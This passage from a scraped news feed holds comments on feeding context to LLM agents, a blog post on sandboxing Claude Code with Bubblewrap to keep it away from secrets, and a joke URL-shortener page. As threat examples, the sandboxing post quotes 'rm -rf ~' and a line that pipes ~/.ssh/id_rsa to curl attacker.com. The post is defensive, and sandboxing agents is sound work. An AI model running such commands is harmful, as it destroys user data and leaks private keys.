    &lt;p&gt;I think the emerging best way is to do "agentic search" over files. If you think about it, Claude Code is quite good at navigating large codebases and finding the required context for a problem.&lt;/p&gt;
    &lt;p&gt;Further, instead of polluting the context of your main agent, you can run a subagent to do search and retrieve the important bits of information and report back to your main agent. This is what Claude Code does if you use the keyword "explore". It starts a subagent with Haiku which reads ten of thousands of tokens in seconds.&lt;/p&gt;
    &lt;p&gt;From my experience the only shortcoming of this approach right now is that it's slow, and sometimes haiku misses some details in what it reads. These will get better very soon (in one or two generations, we will likely see opus 4.5 level intelligence at haiku speeds/price). For now, if not missing a detail is important for your usecase, you can give the output from the first subagent to a second one and ask the second one to find important details the first one missed. I've found this additional step to catch most things the first search missed. You can try this for yourself with Claude Code: ask it to create a plan for your spec, and then pass the plan to a second Claude Code session and ask it to find gaps and missing files from the plan.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash is very good at the search task (it benchmarks quite close to 3 Pro in coding tasks but is much faster). I believe Amp switch to Gemini Flash for their search agent because it is better.&lt;/p&gt;
    &lt;p&gt;If you know you will be pruning or otherwise reusing the context across multiple threads, the best place for context that will be retained is at the beginning due to prompt caching - it will reduce the cost and improve the speed.&lt;/p&gt;
    &lt;p&gt;If not, inserting new context any place other than at the end will cause cache misses and therefore slow down the response and increase cost.&lt;/p&gt;
    &lt;p&gt;Models also have some bias for tokens at start and end of the context window, so potentially there is a reason to put important instructions in one of those places.&lt;/p&gt;
    &lt;p&gt;We ran into this while building GTWY.ai. What worked for us wasn‚Äôt trying to keep a single model ‚Äúcontinuously informed‚Äù, but breaking work into smaller steps with explicit context passed between them. Long-lived context drifted fast. Short-lived, well-scoped context stayed predictable.&lt;/p&gt;
    &lt;p&gt;Every time you send a request to a model you're already providing all of the context history along with it. To edit the context, just send a different context history. You can send whatever you want as history, it's entirely up to you and entirely arbitrary.&lt;/p&gt;
    &lt;p&gt;We only think in conversational turns because that's what we've expected a conversation to 'look like'. But that's just a very deeply ingrained convention.&lt;/p&gt;
    &lt;p&gt;Forget that there is such a thing as 'turns' in a LLM convo for now, imagine that it's all 'one-shot'.&lt;/p&gt;
    &lt;p&gt;So you ask A, it responds A1.&lt;/p&gt;
    &lt;p&gt;But when you and B, and expect B1 - which depends on A and A1 already being in the convo history - consider that you are actually sending that again anyhow.&lt;/p&gt;
    &lt;p&gt;Behind the scenes when you think you're sending just 'B' (next prompt) you're actually sending A + A1 + B aka including the history.&lt;/p&gt;
    &lt;p&gt;A and A1 are usually 'cached' but that's not the simplest way to do it, the caching is an optimization.&lt;/p&gt;
    &lt;p&gt;Without caching the model would just process all of A + A1 + B and B1 in return just the same.&lt;/p&gt;
    &lt;p&gt;And then A + A1 + B + B1 + C and expect C1 in return.&lt;/p&gt;
    &lt;p&gt;It just so happens it will cache the state of the convo at your previous turn, and so it's optimized but the key insight is that you can send whatever context you want at any time.&lt;/p&gt;
    &lt;p&gt;If after you send A + A1 + B + B1 + C and get C1, if you want to then send A + B + C + D and expect D1 ... (basically sending the prompts with no responses) - you can totally do that. It will have to re-process all of that aka no cached state, but it will definitely do it for you.&lt;/p&gt;
    &lt;p&gt;Heck you can send Z + A + X, or A + A1 + X + Y - or whatever you want.&lt;/p&gt;
    &lt;p&gt;So in that sense - what you are really sending (if you're using the simplest form API), is sending 'a bunch of content' and 'expecting a response'. That's it. Everything is actually 'one shot' (prefill =&amp;gt; response) and that's it. It feels conversational but structural and operational convention.&lt;/p&gt;
    &lt;p&gt;So the very simple answer to your question is: send whatever context you want. That's it.&lt;/p&gt;
    &lt;p&gt;There is no such thing as continuous context. There is only context that you start and stop, which is the same as typing those words in the prompt. To make anything carry over to a second thread, it must be included in the second thread's context.&lt;/p&gt;
    &lt;p&gt;Rules are just context, too, and all elaborate AI control systems boil down to these contexts and tool calls.&lt;/p&gt;
    &lt;p&gt;In other words, you can rig it up anyway you like. Only the context in the actual thread (or "continuation," as it used to be called) is sent to the model, which has no memory or context outside that prompt.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46626639"/><published>2026-01-15T01:20:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46626836</id><title>Bubblewrap: A nimble way to prevent agents from accessing your .env files</title><updated>2026-01-15T05:17:46.702384+00:00</updated><content>&lt;doc fingerprint="1d7cde100d851ecd"&gt;
  &lt;main&gt;
    &lt;p&gt;Last week I wrote a thing about how to run Claude Code when you don‚Äôt trust Claude Code. I proposed the creation of a dedicated user account &amp;amp; standard unix access controls. The objective was to stop Claude from dancing through your .env files, eating your secrets. There are some usability problems with that guide- I found a better approach and I wanted to share.&lt;/p&gt;
    &lt;p&gt;TL;DR: Use Bubblewrap to sandbox Claude Code (and other AI agents) without trusting anyone‚Äôs implementation but your own. It‚Äôs simpler than Docker and more secure than a dedicated user account.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Changed Since My Last Post&lt;/head&gt;
    &lt;p&gt;Immediately after publishing, I caught the flu. During three painful days in bed, I realized there are other better approaches. Firejail would likely work well- but also there‚Äôs another solution called Bubblewrap.&lt;/p&gt;
    &lt;p&gt;As I dug into Bubblewrap, I realized something else‚Ä¶ Anthropic uses Bubblewrap!&lt;/p&gt;
    &lt;p&gt;But Anthropic embeds bubblewrap in their client. This implementation has a major disadvantage.&lt;/p&gt;
    &lt;p&gt;Embedding bubblewrap in the client means you have to trust the correctness and security of Anthropic‚Äôs implementation. They deserve credit for thinking about security, but this puzzles me. Why not publish guidance so users can secure themselves from Claude Code? Aren‚Äôt we going to need this for ALL agents? Isn‚Äôt this solution generalizable?&lt;/p&gt;
    &lt;p&gt;Defense-in-depth means we don‚Äôt rely on any single vendor to execute perfectly 100% of the time. Plus, this problem applies to all coding agents, not just Claude Code. I want an approach that doesn‚Äôt tie my security to Anthropic‚Äôs destiny.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Security Problem We‚Äôre Solving&lt;/head&gt;
    &lt;p&gt;Before we dive into Bubblewrap, here‚Äôs what we‚Äôre protecting against:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;You want to run a binary that will execute under your account‚Äôs permissions&lt;/item&gt;
      &lt;item&gt;Your account has access to sensitive files unrelated to the project you‚Äôre working on&lt;/item&gt;
      &lt;item&gt;You want your binary to invoke other standard system tools like &lt;code&gt;ls&lt;/code&gt;,&lt;code&gt;ps -aux&lt;/code&gt;, or&lt;code&gt;less&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;We want to invoke this binary while easily preventing it from accessing sensitive files unrelated to binary‚Äôs activities&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What if Claude Code has a bug? What happens if the bug is exploited, and bubblewrap constraints embedded within the client are not activated? Will Claude Code run &lt;code&gt;rm -rf ~&lt;/code&gt;¬†or¬†&lt;code&gt;cat ~/.ssh/id_rsa | curl attacker.com&lt;/code&gt;?&lt;/p&gt;
    &lt;p&gt;Without your own wrapping of the agent, you‚Äôre at risk. When you wrap your coding agent calls with Bubblewrap, the agent‚Äôs access to dangerous commands is prevented.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Is Bubblewrap?&lt;/head&gt;
    &lt;p&gt;Bubblewrap lets you run untrusted or semi-trusted code without risking your host system. We‚Äôre not trying to build a reproducible deployment artifact. We‚Äôre creating a jail where coding agents can work on your project while being unable to touch &lt;code&gt;~/.aws&lt;/code&gt;, your browser profiles, your ~/Photos library or anything else sensitive.&lt;/p&gt;
    &lt;p&gt;Let‚Äôs explore Bubblewrap through the command line:&lt;/p&gt;
    &lt;code&gt;# Install it (Debian/Ubuntu)
sudo apt install bubblewrap

# Simplest possible sandbox - just isolate the filesystem view
bwrap --ro-bind /usr /usr --symlink usr/lib /lib --symlink usr/lib64 /lib64 \
      --symlink usr/bin /bin --proc /proc --dev /dev \
      --unshare-all --die-with-parent \
      /bin/bash

# Inside the sandbox, try:
ls /home          # Empty or nonexistent
ls /etc           # Empty or nonexistent  
whoami            # Shows "nobody" or your mapped user
ping google.com   # Fails - no network
&lt;/code&gt;
    &lt;head rend="h2"&gt;How This Command Works&lt;/head&gt;
    &lt;p&gt;This command creates a minimal sandboxed environment. Here‚Äôs what each part does:&lt;/p&gt;
    &lt;head rend="h3"&gt;Filesystem access:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;--ro-bind /usr /usr&lt;/code&gt;mounts your system‚Äôs&lt;code&gt;/usr&lt;/code&gt;directory as read-only inside the sandbox&lt;/item&gt;
      &lt;item&gt;The &lt;code&gt;--symlink&lt;/code&gt;commands create shortcuts so programs can find libraries and binaries in expected locations&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--proc /proc&lt;/code&gt;and&lt;code&gt;--dev /dev&lt;/code&gt;give minimal access to system processes and devices&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Isolation:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;--unshare-all&lt;/code&gt;disconnects the sandbox from all system resources (network, shared memory, mount points, etc.)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--die-with-parent&lt;/code&gt;kills the sandbox if your main terminal closes&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;The Result:&lt;/head&gt;
    &lt;p&gt;Bash runs inside a stripped-down environment. It can execute programs from &lt;code&gt;/usr&lt;/code&gt;¬†but can‚Äôt see your home directory, config files, or access the network. Programs work, but they‚Äôre operating in a ghost town version of your filesystem.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Bubblewrap Beats Docker&lt;/head&gt;
    &lt;p&gt;This beats Docker for quick workflows. Docker requires a running daemon and lots of configuration files. Bubblewrap lets you execute your app directly‚Äîno daemon, no stale containers cluttering your system.&lt;/p&gt;
    &lt;p&gt;If you‚Äôre experienced enough to worry about Docker misconfigurations, Bubblewrap gives you more control when you need it. You just run a command. No YAML files or debugging background services.&lt;/p&gt;
    &lt;head rend="h2"&gt;Quick Start: Running Claude Code with Bubblewrap&lt;/head&gt;
    &lt;p&gt;A big part of the reason for needing this, is ‚Äìdangerously-skip-permissions. There are times when it‚Äôs very useful to give an agent autonomy in desiging, experimenting &amp;amp; implementing systems. Last week, I built a wifi access point that hosts a Quakeworld Server and vends web assembly quake clients. It‚Äôs an instant-lan party in a box. I did this unattended and it works. ‚Äìdangerously-skip-permissions is very powerful- assuming you know how to aim it safely.&lt;/p&gt;
    &lt;p&gt;Here‚Äôs how I run Claude Code with &lt;code&gt;--dangerously-skip-permissions&lt;/code&gt;¬†inside a Bubblewrap sandbox:&lt;/p&gt;
    &lt;code&gt;PROJECT_DIR="$HOME/Development/YourProject"
bwrap \
     --ro-bind /usr /usr \
     --ro-bind /lib /lib \
     --ro-bind /lib64 /lib64 \
     --ro-bind /bin /bin \
     --ro-bind /etc/resolv.conf /etc/resolv.conf \
     --ro-bind /etc/hosts /etc/hosts \
     --ro-bind /etc/ssl /etc/ssl \
     --ro-bind /etc/passwd /etc/passwd \
     --ro-bind /etc/group /etc/group \
     --ro-bind "$HOME/.gitconfig" "$HOME/.gitconfig" \
     --ro-bind "$HOME/.nvm" "$HOME/.nvm" \
     --bind "$PROJECT_DIR" "$PROJECT_DIR" \
     --bind "$HOME/.claude" "$HOME/.claude" \
     --tmpfs /tmp \
     --proc /proc \
     --dev /dev \
     --share-net \
     --unshare-pid \
     --die-with-parent \
     --chdir "$PROJECT_DIR" \
     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
     "$(command -v claude)" --dangerously-skip-permissions "Please review Planning/ReportingEnhancementPlan.md"
&lt;/code&gt;
    &lt;head rend="h3"&gt;Key Configuration Lines:&lt;/head&gt;
    &lt;code&gt;# Required for Claude Code to work
--ro-bind "$HOME/.nvm" "$HOME/.nvm" \

# Claude stores auth here. Without this, you'll re-login every time
--bind "$HOME/.claude" "$HOME/.claude" \

# Only add if you understand why you need SSH access
# --ro-bind "$HOME/.ssh" "$HOME/.ssh" \

# Block access to your .env files by overlaying with empty files (You need to know exact path of files 

     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
&lt;/code&gt;
    &lt;p&gt;Important: Most people don‚Äôt need the SSH line. It gives your agent the ability to SSH into systems where you‚Äôve copied a public key. If you don‚Äôt understand the utility, don‚Äôt add it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Not a Dedicated User Account?&lt;/head&gt;
    &lt;p&gt;My previous post proposed creating a custom user account for Claude on the host OS. This approach has three major problems:&lt;/p&gt;
    &lt;head rend="h3"&gt;1. ACL Tuning Becomes a Usability Nightmare&lt;/head&gt;
    &lt;p&gt;You‚Äôll fight with file permissions constantly. You need to tune Access Control Lists to prevent access to sensitive &lt;code&gt;.env&lt;/code&gt;¬†files. This type of friction has killed security initiatives for decades. Security dies on usability hills.&lt;/p&gt;
    &lt;p&gt;I came up with that approach while getting sick with the flu. Please accept my apologies.&lt;/p&gt;
    &lt;head rend="h3"&gt;2. No Network Connectivity Restrictions&lt;/head&gt;
    &lt;p&gt;A custom account doesn‚Äôt solve the network access problem. Claude agents can spin up sockets and connect to whatever they want. Unless you run UFW and restrict outbound connectivity from your host, you risk your agent exfiltrating content.&lt;/p&gt;
    &lt;p&gt;I‚Äôve been creating agents that remotely administer and tune servers. It‚Äôs not responsible to let agents have source:any destination:any access to your network or the Internet. One wrong prompt puts you at risk of data exfiltration. My previous solution was incomplete.&lt;/p&gt;
    &lt;head rend="h3"&gt;3. Docker Is the Wrong Tool&lt;/head&gt;
    &lt;p&gt;Docker solves the ‚Äúit works on my machine‚Äù problem when moving code from your laptop to production servers. But most people aren‚Äôt deploying frequently enough to maintain strong Docker skills.&lt;/p&gt;
    &lt;p&gt;Setting up filesystems and networking in containers takes mental effort. If you just want to run a command safely, you shouldn‚Äôt need to install and configure a background service. People want something that works quickly without the cognitive overhead.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Use Your Own Bubblewrap Instead of Anthropic‚Äôs Sandbox?&lt;/head&gt;
    &lt;p&gt;Everyone makes security mistakes eventually. Claude Code is potentially dangerous. Which approach is safer?&lt;/p&gt;
    &lt;p&gt;Trust Anthropic: Hope their team never makes an implementation mistake that breaks security controls.&lt;/p&gt;
    &lt;p&gt;or&lt;/p&gt;
    &lt;p&gt;Don‚Äôt Trust Anthropic: Implement your own access controls in the operating system that constrain the binary at runtime.&lt;/p&gt;
    &lt;p&gt;There is one other big reason you should know how to leverage Bubblewrap. You need a solution for sandboxing agents that aren‚Äôt Claude Code.&lt;/p&gt;
    &lt;p&gt;Agents should never be considered trustworthy. Even when they have security controls. Put controls around them‚Äîdon‚Äôt rely on agents built with models that have experienced misalignment.&lt;/p&gt;
    &lt;head rend="h2"&gt;A comparison of what you‚Äôre trusting with user-wrapped invocation of bubblewrap versus embedded bubblewrap in a client&lt;/head&gt;
    &lt;head rend="h3"&gt;Running Bubblewrap Yourself:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Linux kernel‚Äôs namespace implementation&lt;/item&gt;
      &lt;item&gt;The Bubblewrap binary (small, auditable codebase)&lt;/item&gt;
      &lt;item&gt;Your own configuration (you wrote it, you understand it)&lt;/item&gt;
      &lt;item&gt;Your own proxy/filtering code&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Using Anthropic‚Äôs Sandbox Runtime:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Everything above, plus:&lt;/item&gt;
      &lt;item&gt;Anthropic‚Äôs wrapper code and configuration choices&lt;/item&gt;
      &lt;item&gt;Anthropic‚Äôs filtering proxy implementation&lt;/item&gt;
      &lt;item&gt;Anthropic‚Äôs update/distribution mechanism (npm)&lt;/item&gt;
      &lt;item&gt;That Anthropic‚Äôs security interests align with yours&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;The Trust Matrix&lt;/head&gt;
    &lt;p&gt;Trust isn‚Äôt binary‚Äîit‚Äôs about understanding what you‚Äôre trusting and why. Here‚Äôs a quick comparison:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Threat&lt;/cell&gt;
        &lt;cell role="head"&gt;DIY bwrap&lt;/cell&gt;
        &lt;cell role="head"&gt;Anthropic SRT&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Claude accidentally &lt;code&gt;rm -rf ~&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;‚úì Protected&lt;/cell&gt;
        &lt;cell&gt;‚úì Protected&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Claude exfiltrating ~/.ssh&lt;/cell&gt;
        &lt;cell&gt;‚úì Protected&lt;/cell&gt;
        &lt;cell&gt;‚úì Protected&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Supply chain attack via npm&lt;/cell&gt;
        &lt;cell&gt;‚úì Not exposed&lt;/cell&gt;
        &lt;cell&gt;‚úó Exposed&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Subtle misconfiguration&lt;/cell&gt;
        &lt;cell&gt;‚úó Your risk&lt;/cell&gt;
        &lt;cell&gt;‚úì Their expertise&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Agent Telemetry you don‚Äôt want sent&lt;/cell&gt;
        &lt;cell&gt;‚úì You control&lt;/cell&gt;
        &lt;cell&gt;? Their choice&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Novel bypass techniques&lt;/cell&gt;
        &lt;cell&gt;‚úó You‚Äôre on your own&lt;/cell&gt;
        &lt;cell&gt;‚úì Their team watches&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;So in Anthropic‚Äôs defense: this is not cut-and-dried. Most companies don‚Äôt have resources for great security teams. You have to decide whether you can own this. Many companies will be wise to rely on Anthropic‚Äôs expertise. Their reputation is on the line if someone breaks their sandbox implementation. But you‚Äôre going to be locked into Anthropic‚Äôs security model if you don‚Äôt learn how to wield bubblewrap. Pivoting to a new agent will require figuring out security there. Why not just rip the band aid off and learn bubblewrap?&lt;/p&gt;
    &lt;head rend="h2"&gt;Don‚Äôt trust me either!&lt;/head&gt;
    &lt;p&gt;This has been a fun writeup on trusting trust. TRUST ME!&lt;/p&gt;
    &lt;p&gt;But you shouldn‚Äôt trust me! I might be a Dog on the Internet. Maybe I‚Äôm ai slop?!&lt;/p&gt;
    &lt;p&gt;Here is some code you can use to test the bwrap container I provided for my claude usage. Note that this is invoked different- we‚Äôre not going to call claude- we‚Äôre going to call bash and pass it the test script. My test script is available here:&lt;/p&gt;
    &lt;p&gt;All you need to do is create a YourProject folder in your ~/$HOME/Development directory. Then create a sandbox-escape-test.sh in there. Fill it with the test code from my github.&lt;/p&gt;
    &lt;p&gt;Read and understand what the script does before executing it. This post is already pretty long üòÄ&lt;/p&gt;
    &lt;head rend="h2"&gt;Wrapping Up&lt;/head&gt;
    &lt;p&gt;I‚Äôm building with many agents‚Äînot just Claude Code. I need a generalized solution for sandboxing that I can apply to other agents.&lt;/p&gt;
    &lt;p&gt;Anthropic deserves attention and credit for the constraints they‚Äôre giving you. I wish they had published them in a way that doesn‚Äôt tie your security destiny to their ability to execute correctly 100% of the time.&lt;/p&gt;
    &lt;p&gt;The choice is yours: trust a vendor‚Äôs implementation, or take control of your own security boundaries. Both are valid. I might be paranoid. Are you feeling lucky?&lt;/p&gt;
    &lt;p&gt;p.s. If I ever get run over by a flaming pizza truck, here‚Äôs a handy 1 liner:&lt;/p&gt;
    &lt;code&gt;claude "Act as a security expert with a specialization in Linux system security.  Help me generate a bubblewrap script for safely invoking coding agents so they do not have access to sensitive data on my file system and appropriately manage other security risks, even though they're going to be invoked under my account's permissions.  Let's talk through everything that the agent should be able to do &amp;amp; access first, and then generate an appropriate bwrap script for delivering that capability.  Then let's discuss what access we should restrict."&lt;/code&gt;
    &lt;p&gt;Need help on topics related to this? I‚Äôm currently freelance! Let‚Äôs connect and build secure things at incredibly high speed:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://patrickmccanna.net/a-better-way-to-limit-claude-code-and-other-coding-agents-access-to-secrets/"/><published>2026-01-15T01:45:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46627652</id><title>The URL shortener that makes your links look as suspicious as possible</title><updated>2026-01-15T05:17:46.284360+00:00</updated><content>&lt;doc fingerprint="5aac401b9dd45eea"&gt;
  &lt;main&gt;
    &lt;p&gt;The URL shortener that makes your links look as suspicious as possible.&lt;/p&gt;
    &lt;p&gt;Normal links are too trustworthy. Make them creepy.&lt;/p&gt;
    &lt;p&gt;Your suspiciously shortened URL:&lt;/p&gt;
    &lt;p&gt;Copied to clipboard!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://creepylink.com/"/><published>2026-01-15T03:28:20+00:00</published></entry></feed>